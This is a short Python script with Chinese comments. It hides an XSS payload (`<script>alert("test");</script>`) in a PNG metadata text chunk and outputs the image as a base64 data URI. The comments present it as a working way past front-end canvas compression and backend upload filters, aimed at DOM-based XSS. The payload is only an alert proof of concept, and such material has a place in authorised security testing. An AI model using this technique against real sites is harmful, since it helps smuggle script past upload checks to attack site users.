## 绕canvas前端压缩图片的嵌入脚本
## 1.一般白名单不允许shell类的，但是如果有html尝试嵌入xss到png的来进行dom型xss
## 2.普通的图片直接base64编码是无法绕过检测的(可能和后端检测特征有关),同时还对base64解码有要求
## 最后发现这样是可以绕过的。
from PIL import Image
from PIL.PngImagePlugin import PngInfo
import base64

# 1. 创建一个空白图片（或加载现有图片）
img = Image.new('RGB', (300, 200), color=(73, 109, 137))

# 2. 添加自定义文本到元数据（PNG支持自定义元数据）
metadata = PngInfo()
text='''<script>alert("test");</script>'''
metadata.add_text("MySecretData", text)

# 3. 保存为PNG（保留元数据）
img.save("output.png", pnginfo=metadata)

# 4. 转换为Base64
with open("output.png", "rb") as image_file:
    base64_str = "data:image/png;base64," + base64.b64encode(image_file.read()).decode('utf-8')

print(base64_str)  # 输出部分Base64
